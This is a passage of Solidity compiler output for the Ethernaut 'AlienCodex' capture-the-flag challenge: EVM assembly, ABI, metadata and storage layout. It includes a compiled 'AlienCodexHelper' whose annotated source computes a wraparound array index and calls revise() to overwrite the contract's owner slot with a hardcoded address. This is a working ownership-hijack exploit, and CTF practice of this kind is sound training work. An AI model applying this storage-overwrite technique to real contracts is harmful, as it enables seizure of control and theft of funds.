											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "JUMPI"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "INVALID"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "JUMPDEST"
										},
										{
											"begin": 442,
											"end": 447,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 453,
											"end": 461,
											"name": "DUP2"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "DUP1"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "SLOAD"
										},
										{
											"begin": 23,
											"end": 41,
											"name": "ADD"
										},
										{
											"begin": 57,
											"end": 67,
											"name": "DUP1"
										},
										{
											"begin": 52,
											"end": 55,
											"name": "DUP3"
										},
										{
											"begin": 45,
											"end": 68,
											"name": "SSTORE"
										},
										{
											"begin": 79,
											"end": 89,
											"name": "DUP1"
										},
										{
											"begin": 72,
											"end": 89,
											"name": "SWAP2"
										},
										{
											"begin": 72,
											"end": 89,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 93,
											"name": "POP"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "DUP3"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SUB"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "MSTORE"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "KECCAK256"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "ADD"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP2"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP3"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP2"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP1"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SWAP2"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "POP"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "SSTORE"
										},
										{
											"begin": 442,
											"end": 462,
											"name": "POP"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "POP"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "JUMPDEST"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 410,
											"end": 417,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "JUMPDEST"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "JUMPI"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "DUP1"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "REVERT"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "JUMPDEST"
										},
										{
											"begin": 755,
											"end": 783,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 774,
											"end": 782,
											"name": "DUP2"
										},
										{
											"begin": 755,
											"end": 773,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 755,
											"end": 783,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 755,
											"end": 783,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 755,
											"end": 783,
											"name": "JUMPDEST"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "POP"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 796,
											"end": 979,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 796,
											"end": 979,
											"name": "JUMPDEST"
										},
										{
											"begin": 889,
											"end": 890,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 869,
											"end": 891,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 869,
											"end": 891,
											"name": "AND"
										},
										{
											"begin": 869,
											"end": 877,
											"name": "DUP2"
										},
										{
											"begin": 869,
											"end": 891,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 869,
											"end": 891,
											"name": "AND"
										},
										{
											"begin": 869,
											"end": 891,
											"name": "EQ"
										},
										{
											"begin": 869,
											"end": 891,
											"name": "ISZERO"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "PUSH [tag]",
											"value": "68"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "JUMPI"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "DUP1"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "REVERT"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "tag",
											"value": "68"
										},
										{
											"begin": 861,
											"end": 892,
											"name": "JUMPDEST"
										},
										{
											"begin": 936,
											"end": 944,
											"name": "DUP1"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "AND"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "DUP1"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "SWAP1"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "SLOAD"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "SWAP1"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "EXP"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "SWAP1"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "DIV"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 928,
											"end": 934,
											"name": "AND"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "AND"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "PUSH",
											"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "MLOAD"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "MLOAD"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "DUP1"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "SWAP2"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "SUB"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "SWAP1"
										},
										{
											"begin": 907,
											"end": 945,
											"name": "LOG3"
										},
										{
											"begin": 964,
											"end": 972,
											"name": "DUP1"
										},
										{
											"begin": 955,
											"end": 961,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 955,
											"end": 961,
											"name": "DUP1"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "EXP"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "DUP2"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "SLOAD"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "DUP2"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "MUL"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "NOT"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "AND"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "SWAP1"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "DUP4"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "AND"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "MUL"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "OR"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "SWAP1"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "SSTORE"
										},
										{
											"begin": 955,
											"end": 972,
											"name": "POP"
										},
										{
											"begin": 796,
											"end": 979,
											"name": "POP"
										},
										{
											"begin": 796,
											"end": 979,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SLOAD"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP4"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SSTORE"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "GT"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "ISZERO"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP4"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "MSTORE"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "KECCAK256"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP3"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "ADD"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "ADD"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "POP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "POP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "POP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "73"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP3"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "GT"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "ISZERO"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "74"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SSTORE"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "POP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "ADD"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "73"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "74"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "POP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "72"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SWAP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"codex(uint256)": "94bd7569",
							"contact()": "33a8c45a",
							"isOwner()": "8f32d59b",
							"make_contact()": "58699c55",
							"owner()": "8da5cb5b",
							"record(bytes32)": "b5c645bd",
							"renounceOwnership()": "715018a6",
							"retract()": "47f57b32",
							"revise(uint256,bytes32)": "0339f300",
							"transferOwnership(address)": "f2fde38b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"codex\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"contact\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"make_contact\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_content\",\"type\":\"bytes32\"}],\"name\":\"record\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"retract\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"i\",\"type\":\"uint256\"},{\"internalType\":\"bytes32\",\"name\":\"_content\",\"type\":\"bytes32\"}],\"name\":\"revise\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/AlienCodex.sol\":\"AlienCodex\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/AlienCodex.sol\":{\"keccak256\":\"0x5a1d152f51b9c10d4b829ac248769cecd0d7a9b2664e257d3355a8afca61632f\",\"urls\":[\"bzz-raw://48a2f60e127602afef01a8312d379264018a4da7f9014cf2abbe67dbf81adee9\",\"dweb:/ipfs/QmZrjNo4KoxLL6LQjRrsfynjbWNq2MNWzW4m67ZfyYXBpp\"]},\"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":{\"keccak256\":\"0x4d3de93fedfe39152201ffcc94cb9fa8ad80e5eae754e97c714057038f6beb5d\",\"urls\":[\"bzz-raw://a140c5698887488c3af1dcb9b661e83bcd9392449db8e111a19d5ba012f46208\",\"dweb:/ipfs/QmaK15toJWNimvohnYNTfvZK7akJUkWVVZajA1x638iRnP\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 112,
								"contract": "contracts/Ethernaut/AlienCodex.sol:AlienCodex",
								"label": "_owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 6,
								"contract": "contracts/Ethernaut/AlienCodex.sol:AlienCodex",
								"label": "contact",
								"offset": 20,
								"slot": "0",
								"type": "t_bool"
							},
							{
								"astId": 9,
								"contract": "contracts/Ethernaut/AlienCodex.sol:AlienCodex",
								"label": "codex",
								"offset": 0,
								"slot": "1",
								"type": "t_array(t_bytes32)dyn_storage"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_array(t_bytes32)dyn_storage": {
								"base": "t_bytes32",
								"encoding": "dynamic_array",
								"label": "bytes32[]",
								"numberOfBytes": "32"
							},
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"contracts/Ethernaut/AlienCodexHelper.sol": {
				"AlienCodexHelper": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "alienCodexAddr",
									"type": "address"
								}
							],
							"name": "resolve",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/AlienCodexHelper.sol\":88:405  contract AlienCodexHelper {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"contracts/Ethernaut/AlienCodexHelper.sol\":88:405  contract AlienCodexHelper {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":88:405  contract AlienCodexHelper {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":88:405  contract AlienCodexHelper {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x55ea6c47\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":121:402  function resolve(address alienCodexAddr) public {\r... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_5\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_5:\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":121:402  function resolve(address alienCodexAddr) public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_6\n      jump\t// in\n    tag_4:\n      stop\n    tag_6:\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":180:194  uint slotIndex */\n      0x00\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":197:198  1 */\n      0x01\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":180:198  uint slotIndex = 1 */\n      swap1\n      pop\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":209:215  uint i */\n      0x00\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":278:279  1 */\n      0x01\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":263:272  slotIndex */\n      dup3\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":246:273  abi.encodePacked(slotIndex) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":246:273  abi.encodePacked(slotIndex) */\n      swap1\n      0x40\n      mstore\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":236:274  keccak256(abi.encodePacked(slotIndex)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":231:275  uint(keccak256(abi.encodePacked(slotIndex))) */\n      0x00\n      shr\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":218:228  2**256 - 1 */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":218:275  2**256 - 1 - uint(keccak256(abi.encodePacked(slotIndex))) */\n      sub\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":218:279  2**256 - 1 - uint(keccak256(abi.encodePacked(slotIndex))) + 1 */\n      add\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":209:279  uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(slotIndex))) + 1 */\n      swap1\n      pop\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":301:315  alienCodexAddr */\n      dup3\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":290:323  AlienCodex(alienCodexAddr).revise */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x0339f300\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":324:325  i */\n      dup3\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":327:393  0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9 */\n      0x6343a423ab47cf92f89e2451171d38ac1d0606e9\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":290:394  AlienCodex(alienCodexAddr).revise(i, 0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      0x00\n      shl\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_8:\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":290:394  AlienCodex(alienCodexAddr).revise(i, 0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_9:\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":290:394  AlienCodex(alienCodexAddr).revise(i, 0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9) */\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Ethernaut/AlienCodexHelper.sol\":121:402  function resolve(address alienCodexAddr) public {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa265627a7a72315820cf583a10b34be3b8e32f190fe297ebbc5602b94ca08b0f97b58b7e42cf572bfb64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
